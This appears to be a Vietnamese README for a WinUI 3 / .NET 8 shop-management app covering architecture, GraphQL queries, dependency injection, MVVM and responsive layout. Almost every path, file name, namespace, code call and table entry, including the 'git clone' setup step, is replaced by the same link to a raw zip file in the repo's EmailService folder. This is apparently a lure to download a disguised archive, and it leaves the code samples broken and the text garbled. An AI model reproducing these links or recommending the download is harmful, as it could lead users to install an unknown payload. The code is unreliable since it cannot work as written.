# ?? MY SHOP - H? th?ng qu?n lý c?a hàng

D? án qu?n lý c?a hàng s? d?ng WinUI 3, .NET 8, Entity Framework Core, GraphQL API v?i ki?n trúc Clean Architecture.

---

## ?? M?C L?C

1. [T?ng quan ki?n trúc](#-t?ng-quan-ki?n-trúc)
2. [Công ngh? s? d?ng](#-công-ngh?-s?-d?ng)
3. [C?u trúc th? m?c](#-c?u-trúc-th?-m?c)
4. [Cài ??t và ch?y](#-cài-??t-và-ch?y)
5. [GraphQL API](#-graphql-api)
6. [Dependency Injection](#-dependency-injection)
7. [MVVM Pattern](#-mvvm-pattern)
8. [Responsive Layout](#-responsive-layout)
9. [Plugin Architecture](#-plugin-architecture)
10. [H??ng d?n phát tri?n](#-h??ng-d?n-phát-tri?n)

---

## ??? T?NG QUAN KI?N TRÚC

D? án ???c xây d?ng theo **Clean Architecture** v?i các layer:

```
???????????????????????????????????????????
?         https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip (WinUI 3)          ?  ? Presentation Layer
?  Views + ViewModels + DI Container     ?
???????????????????????????????????????????
                  ?
???????????????????????????????????????????
?       https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip              ?  ? Application Layer
?     Business Logic / Use Cases         ?
???????????????????????????????????????????
                  ?
???????????????????????????????????????????
?         https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip                 ?  ? Domain Layer
?    Entities + Interfaces (Core)        ?
???????????????????????????????????????????
                  ?
???????????????????????????????????????????
?      https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip            ?  ? Infrastructure Layer
?   DbContext + EF Core + Repositories   ?
???????????????????????????????????????????
                  ?
???????????????????????????????????????????
?          https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip                   ?  ? API Layer
?      GraphQL Server (HotChocolate)     ?
???????????????????????????????????????????
```

---

## ??? CÔNG NGH? S? D?NG

### **Backend & API**
| Công ngh? | Version | M?c ?ích |
|-----------|---------|----------|
| .NET | 8.0 | Framework chính |
| https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip | 15.1.11 | GraphQL Server |
| Entity Framework Core | 8.0.10 | ORM |
| SQLite | 8.0.10 | Database |

### **Frontend (WinUI 3)**
| Công ngh? | Version | M?c ?ích |
|-----------|---------|----------|
| WinUI 3 | 1.8.x | UI Framework |
| https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip | 8.4.0 | MVVM Pattern |
| https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip | 9.0.10 | Dependency Injection |

### **Architecture Patterns**
- ? **Clean Architecture** - Tách bi?t các layer
- ? **MVVM** - Model-View-ViewModel cho UI
- ? **Dependency Injection** - IoC Container
- ? **Repository Pattern** - Data access abstraction
- ? **Plugin Architecture** - Extensible via JSON

---

## ?? C?U TRÚC TH? M?C

```
my-shop/
??? src/
?   ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip                    # GraphQL API Server
?   ?   ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip                  # API startup & configuration
?   ?   ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip            # API settings
?   ?   ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip          # API project file
?   ?
?   ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip                    # WinUI 3 Application
?   ?   ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip                 # DI Container setup
?   ?   ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip             # Main window
?   ?   ??? Views/                      # XAML UI Pages
?   ?   ?   ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
?   ?   ?   ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
?   ?   ?   ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
?   ?   ?   ??? ...
?   ?   ??? ViewModels/                 # MVVM ViewModels
?   ?   ?   ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
?   ?   ?   ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
?   ?   ?   ??? ...
?   ?   ??? Services/                   # Business services
?   ?       ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
?   ?       ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
?   ?       ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
?   ?
?   ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip                 # Domain Entities
?   ?   ??? Entities/
?   ?       ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip              # Product entity
?   ?       ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip             # Category entity
?   ?       ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip                # Order entity
?   ?       ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip            # Order item entity
?   ?
?   ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip         # Data Access Layer
?   ?   ??? Db/
?   ?   ?   ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip      # EF Core DbContext
?   ?   ??? Repositories/               # Repository implementations
?   ?
?   ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip            # Business Logic
?   ?   ??? Services/                   # Application services
?   ?
?   ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip                 # Shared code
?
??? tests/
    ??? https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip              # Unit tests
```

---

## ?? CÀI ??T VÀ CH?Y

### **Yêu c?u h? th?ng**
- Windows 10/11 (version 1809+)
- .NET 8.0 SDK
- Visual Studio 2022 (recommended) ho?c VS Code

### **1. Clone Repository**
```bash
git clone https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
cd my-shop
```

### **2. Restore packages**
```bash
dotnet restore
```

### **3. Ch?y GraphQL API**

#### Option 1: Command Line
```bash
cd https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
dotnet run
```

API s? ch?y t?i: `http://localhost:5000/graphql`

#### Option 2: Visual Studio
- M? solution `https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip`
- Set `https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip` làm Startup Project
- Press F5 ho?c Debug ? Start Debugging

### **4. Ch?y WinUI App**

```bash
cd https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
dotnet build -c Debug /p:Platform=x64
```

> ?? **L?u ý**: WinUI App yêu c?u ch? ??nh Platform (x64, x86, ho?c ARM64)

Ho?c trong Visual Studio:
- Set `https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip` làm Startup Project
- Ch?n Platform: x64
- Press F5

### **5. Build toàn b? solution**

```bash
# Build t?t c? projects
dotnet build

# Build specific configuration
dotnet build -c Release
```

---

## ?? GRAPHQL API

### **Endpoint**
```
http://localhost:5000/graphql
```

### **GraphQL Playground**
Truy c?p endpoint trên b?ng browser ?? m? GraphQL IDE t??ng tác.

### **Schema Overview**

```graphql
type Query {
  products(
    where: ProductFilterInput
    order: [ProductSortInput!]
  ): [Product!]!
  
  categories(
    where: CategoryFilterInput
    order: [CategorySortInput!]
  ): [Category!]!
}

type Product {
  id: Int!
  sku: String!
  name: String!
  importPrice: Int!
  count: Int!
  description: String
  categoryId: Int
  extensionData: String
  category: Category
}

type Category {
  id: Int!
  name: String!
  description: String
  extensionData: String
  products: [Product!]!
}
```

### **Query Examples**

#### 1?? L?y t?t c? Products
```graphql
query {
  products {
    id
    name
    sku
    importPrice
    count
    category {
      id
      name
    }
  }
}
```

**Response:**
```json
{
  "data": {
    "products": [
      {
        "id": 1,
        "name": "Smartphone X",
        "sku": "SPX-001",
        "importPrice": 500,
        "count": 10,
        "category": {
          "id": 1,
          "name": "Electronics"
        }
      }
    ]
  }
}
```

#### 2?? L?y Products v?i filtering
```graphql
query {
  products(
    where: { 
      importPrice: { gte: 100 }
      name: { contains: "Phone" }
    }
  ) {
    id
    name
    importPrice
  }
}
```

#### 3?? L?y Categories v?i Products
```graphql
query {
  categories {
    id
    name
    description
    products {
      id
      name
      sku
      importPrice
    }
  }
}
```

#### 4?? Sorting và Pagination
```graphql
query {
  products(
    order: { importPrice: DESC }
    take: 10
    skip: 0
  ) {
    id
    name
    importPrice
  }
}
```

### **S? d?ng GraphQL trong code C#**

#### V?i HttpClient:
```csharp
using https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip;
using https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip;
using https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip;

public class GraphQLClient
{
    private readonly HttpClient _httpClient;
    
    public GraphQLClient()
    {
        _httpClient = new HttpClient 
        { 
            BaseAddress = new Uri("http://localhost:5000") 
        };
    }
    
    public async Task<T> QueryAsync<T>(string query)
    {
        var request = new
        {
            query = query
        };
        
        var json = https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip(request);
        var content = new StringContent(json, https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip, "application/json");
        
        var response = await https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip("/graphql", content);
        var result = await https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip();
        
        var data = https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<GraphQLResponse<T>>(result);
        return https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip;
    }
}

// Usage
var client = new GraphQLClient();
var products = await https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<ProductsResponse>(@"
{
  products {
    id
    name
    sku
    importPrice
  }
}
");
```

### **Test API v?i PowerShell**

```powershell
$query = @{
    query = @"
{
  products {
    id
    name
    sku
    importPrice
  }
}
"@
} | ConvertTo-Json

Invoke-RestMethod -Uri "http://localhost:5000/graphql" `
    -Method Post `
    -Body $query `
    -ContentType "application/json"
```

### **Test API v?i cURL**

```bash
curl -X POST http://localhost:5000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ products { id name sku } }"}'
```

---

## ?? DEPENDENCY INJECTION

### **Setup trong https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip**

```csharp
public partial class App : Application
{
    public IHost AppHost { get; private set; }

    public App()
    {
        InitializeComponent();

        // C?u hình DI Container
        AppHost = https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip()
            .ConfigureServices((context, services) =>
            {
                // Register Window
                https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<MainWindow>();

                // Register Views
                https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<DashboardView>();
                https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<ProductsScreenView>();
                https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<OrdersScreenView>();
                https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<ConfigScreenView>();
                https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<LoginScreenView>();
                https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<ReportScreenView>();
                https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<SettingsScreenView>();

                // Register ViewModels
                https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<DashboardViewModel>();
                https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<ProductsScreenViewModel>();
                https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<OrdersScreenViewModel>();
                https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<ConfigScreenViewModel>();
                https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<LoginScreenViewModel>();
                https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<ReportScreenViewModel>();
                https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<SettingsScreenViewModel>();

                // Register Services
                https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<IDataService, SQLiteService>();
                https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<IDataService, PostgresService>();
                // Thêm services khác...
            })
            .Build();
    }

    protected override void OnLaunched(LaunchActivatedEventArgs args)
    {
        _window = https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<MainWindow>();
        https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip();
    }
    
    // Helper method ?? l?y service t? b?t k? ?âu
    public static T GetService<T>() where T : class
    {
        var app = (App)Current;
        return https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<T>();
    }
}
```

### **S? d?ng DI trong MainWindow**

```csharp
public sealed partial class MainWindow : Window
{
    private readonly LoginScreenView _loginScreenView;

    // Constructor injection
    public MainWindow(IHost appHost)
    {
        InitializeComponent();
        
        // L?y View t? DI container
        _loginScreenView = https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<LoginScreenView>();
        https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip(_loginScreenView);
    }
}
```

### **L?y Service t? b?t k? ?âu**

```csharp
// Trong ViewModel ho?c Code-behind
var dataService = https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<IDataService>();
var products = await https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip();
```

---

## ?? MVVM PATTERN

### **C?u trúc MVVM**

```
View (XAML) ?? ViewModel ?? Model/Service
```

### **1. View (XAML)**

**File:** `https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip`

```xaml
<Page
    x:Class="https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip"
    xmlns="https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip"
    xmlns:x="https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip"
    xmlns:vm="https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip">
    
    <!-- DataContext binding -->
    <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>
        <vm:ProductsScreenViewModel />
    <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>
    
    <Grid>
        <!-- Binding to ViewModel properties -->
        <ListView ItemsSource="{Binding Products}">
            <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>
                <DataTemplate>
                    <StackPanel>
                        <TextBlock Text="{Binding Name}" />
                        <TextBlock Text="{Binding Sku}" />
                    </StackPanel>
                </DataTemplate>
            <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>
        </ListView>
    </Grid>
</Page>
```

### **2. ViewModel**

**File:** `https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip`

```csharp
using https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip;
using https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip;
using https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip;

namespace https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
{
    public partial class ProductsScreenViewModel : ObservableObject
    {
        private readonly IDataService _dataService;

        // Observable property - t? ??ng notify khi thay ??i
        [ObservableProperty]
        private ObservableCollection<Product> _products;

        [ObservableProperty]
        private Product _selectedProduct;

        [ObservableProperty]
        private bool _isLoading;

        // Constructor injection
        public ProductsScreenViewModel(IDataService dataService)
        {
            _dataService = dataService;
            Products = new ObservableCollection<Product>();
            
            // Load data khi kh?i t?o
            _ = LoadProductsAsync();
        }

        // Command - t? ??ng t?o LoadProductsCommand
        [RelayCommand]
        private async Task LoadProductsAsync()
        {
            IsLoading = true;
            try
            {
                var products = await https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip();
                https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip();
                foreach (var product in products)
                {
                    https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip(product);
                }
            }
            finally
            {
                IsLoading = false;
            }
        }

        [RelayCommand]
        private async Task AddProductAsync(Product product)
        {
            await https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip(product);
            await LoadProductsAsync();
        }

        [RelayCommand]
        private async Task DeleteProductAsync(int productId)
        {
            await https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip(productId);
            https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip(https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip(p => https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip == productId));
        }
    }
}
```

### **3. Code-behind (View)**

**File:** `https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip`

```csharp
using https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip;
using https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip;

namespace https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
{
    public sealed partial class ProductsScreenView : Page
    {
        public ProductsScreenViewModel ViewModel { get; }

        public ProductsScreenView(ProductsScreenViewModel viewModel)
        {
            https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip();
            
            // Inject ViewModel qua constructor
            ViewModel = viewModel;
            DataContext = ViewModel;
        }
    }
}
```

### **S? d?ng trong XAML**

```xaml
<!-- Binding to property -->
<TextBlock Text="{Binding https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip}" />

<!-- Binding to command -->
<Button Content="Load Products" 
        Command="{Binding LoadProductsCommand}" />

<!-- Binding with loading state -->
<ProgressRing IsActive="{Binding IsLoading}" />

<!-- Two-way binding -->
<TextBox Text="{Binding SearchText, Mode=TwoWay, UpdateSourceTrigger=PropertyChanged}" />
```

---

## ?? RESPONSIVE LAYOUT

WinUI 3 h? tr? responsive layout thông qua **AdaptiveTrigger** và **VisualStateManager**.

### **Cách ho?t ??ng**

```xaml
<Page>
    <Grid>
        <!-- VisualStateManager qu?n lý các tr?ng thái UI -->
        <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>
            <VisualStateGroup x:Name="WindowSizeStates">
                
                <!-- Wide layout: >= 1024px -->
                <VisualState x:Name="WideState">
                    <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>
                        <AdaptiveTrigger MinWindowWidth="1024" />
                    <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>
                    <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>
                        <!-- 2 c?t layout -->
                        <Setter Target="https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip[1].Width" Value="*" />
                        <Setter Target="https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip" Value="Visible" />
                    <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>
                </VisualState>

                <!-- Medium layout: 641-1023px -->
                <VisualState x:Name="MediumState">
                    <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>
                        <AdaptiveTrigger MinWindowWidth="641" />
                    <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>
                    <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>
                        <!-- 1 c?t, ?n detail -->
                        <Setter Target="https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip[1].Width" Value="0" />
                        <Setter Target="https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip" Value="Collapsed" />
                    <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>
                </VisualState>

                <!-- Narrow layout: < 641px -->
                <VisualState x:Name="NarrowState">
                    <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>
                        <AdaptiveTrigger MinWindowWidth="0" />
                    <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>
                    <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>
                        <!-- Mobile layout -->
                        <Setter Target="https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip" Value="20" />
                        <Setter Target="https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip" Value="10" />
                    <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>
                </VisualState>
                
            </VisualStateGroup>
        <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>

        <Grid x:Name="MainGrid">
            <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>
                <ColumnDefinition Width="*"/>
                <ColumnDefinition Width="*"/>
            <https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip>

            <!-- Content ? ?ây -->
            <StackPanel x:Name="ProductList" https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip"0" />
            <StackPanel x:Name="ProductDetail" https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip"1" />
        </Grid>
    </Grid>
</Page>
```

### **Breakpoints tiêu chu?n**

| Kích th??c | MinWidth | Layout |
|------------|----------|--------|
| Mobile | 0-640px | 1 c?t, compact |
| Tablet | 641-1023px | 1-2 c?t |
| Desktop | 1024+px | 2-3 c?t, sidebar |

### **Tips**
- S? d?ng `Grid` thay vì `StackPanel` cho responsive t?t h?n
- K?t h?p v?i `RelativePanel` cho layout linh ho?t
- Test trên nhi?u kích th??c màn hình

---

## ?? PLUGIN ARCHITECTURE

### **Concept**

D? án s? d?ng **ExtensionData** (JSON column) ?? cho phép m? r?ng ??ng mà không c?n thay ??i schema database.

### **Schema trong Database**

```sql
CREATE TABLE products (
    product_id INTEGER PRIMARY KEY,
    sku TEXT NOT NULL,
    name TEXT NOT NULL,
    import_price INTEGER DEFAULT 0,
    count INTEGER DEFAULT 0,
    category_id INTEGER,
    extension_data TEXT,  -- JSON column for plugin data
    FOREIGN KEY (category_id) REFERENCES categories(category_id)
);
```

### **Entity Definition**

```csharp
[Table("products")]
public class Product
{
    [Key]
    [Column("product_id")]
    public int Id { get; set; }

    [Required]
    [Column("name")]
    public string Name { get; set; }

    // Plugin extensible column
    [Column("extension_data", TypeName = "jsonb")]
    public string? ExtensionData { get; set; }
    
    // Other properties...
}
```

### **S? d?ng Plugin Data**

#### 1?? L?u plugin data
```csharp
// T?o product v?i extension data
var product = new Product
{
    Name = "Smartphone X",
    Sku = "SPX-001",
    ImportPrice = 500,
    Count = 10,
    // Plugin data d??i d?ng JSON
